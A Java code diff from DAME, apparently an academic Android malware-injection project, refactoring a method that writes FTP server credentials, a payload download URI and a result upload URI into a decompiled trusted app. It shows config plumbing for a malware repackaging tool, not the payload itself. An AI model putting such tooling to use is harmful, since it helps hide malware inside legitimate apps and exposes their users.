@@ -4,13 +4,13 @@
 
 package it.unisannio.srss.dame.injection;
 
+import it.unisannio.srss.dame.model.FTPServerConfig;
 import it.unisannio.srss.utils.DirectoryCopier;
 import it.unisannio.srss.utils.FileUtils;
 import it.unisannio.srss.utils.ManifestManipulator;
 
 import java.io.File;
 import java.io.FileNotFoundException;
-import java.io.FileWriter;
 import java.io.IOException;
 import java.nio.file.Path;
 import java.nio.file.Paths;
@@ -26,11 +26,7 @@ public class CommonInjector {
 	public static final String manifestName = "AndroidManifest.xml";
 
 	final static String CONFIG_FILE = "config.properties";
-	final static String SERVER_PROPERTY = "server";
-	final static String DOWNLOAD_PROPERTY = "payload_uri";
-	final static String UPLOAD_PROPERTY = "result_uri";
-	final static String USERNAME_PROPERTY = "username";
-	final static String PASSWORD_PROPERTY = "password";
+
 
 	/**
 	 * Copia il contenuto di una directory in un'altra directory
@@ -104,8 +100,8 @@ public class CommonInjector {
 	 * Inietta la configurazione per la connessione al server ftp nella parte
 	 * android del progetto del malware
 	 * 
-	 * @param dameAndroid
-	 *            il root path in cui e' presente il progetto DAME Android
+	 * @param appSmaliPath
+	 *            il root path in cui e' l'app trusted decompilata
 	 * @param ftpURL
 	 *            l'url del server ftp
 	 * @param username
@@ -119,40 +115,14 @@ public class CommonInjector {
 	 *            dell'esecuzione del malware
 	 * @throws IOException
 	 */
-	public static void injectFtpConfig(Path dameAndroid, String ftpURL,
-			String username, String password, String payloadsURI,
-			String resultURI) throws IOException {
+	public static void injectFtpConfig(Path appSmaliPath, FTPServerConfig serverConfig) throws IOException {
 		// TODO manca la generazione del file che contiene url e credenziali del
 		// server ftp.
 		// assumi che tutte queste informazioni vengono passate come parametri
-		Path config = Paths.get(dameAndroid.toString(), "src", "it",
+		Path config = Paths.get(appSmaliPath.toString(), "unknown", "it",
 				"unisannio", "srss", "dame", "android", CONFIG_FILE);
-		File configFile = config.toFile();
+		
+		serverConfig.writeToFile(config.toFile());
 
-		if (!configFile.exists())
-			configFile.createNewFile();
-
-		if (!configFile.canWrite()) {
-			String err = "Could not write to output config file: "
-					+ configFile.getAbsolutePath();
-			LOG.error(err);
-			throw new FileNotFoundException(err);
-		}
-
-		// overwrite
-		LOG.info("Start writing ftp config file");
-		FileWriter configWriter = new FileWriter(configFile, false);
-		configWriter.write(SERVER_PROPERTY + "=" + ftpURL);
-		LOG.debug("Write:\t" + SERVER_PROPERTY + "=" + ftpURL);
-		configWriter.write(USERNAME_PROPERTY + "=" + username);
-		LOG.debug("Write:\t" + USERNAME_PROPERTY + "=" + username);
-		configWriter.write(PASSWORD_PROPERTY + "=" + password);
-		LOG.debug("Write:\t" + PASSWORD_PROPERTY + "=" + password);
-		configWriter.write(DOWNLOAD_PROPERTY + "=" + payloadsURI);
-		LOG.debug("Write:\t" + DOWNLOAD_PROPERTY + "=" + payloadsURI);
-		configWriter.write(UPLOAD_PROPERTY + "=" + resultURI);
-		LOG.debug("Write:\t" + UPLOAD_PROPERTY + "=" + resultURI);
-		configWriter.flush();
-		configWriter.close();
 	}
 }
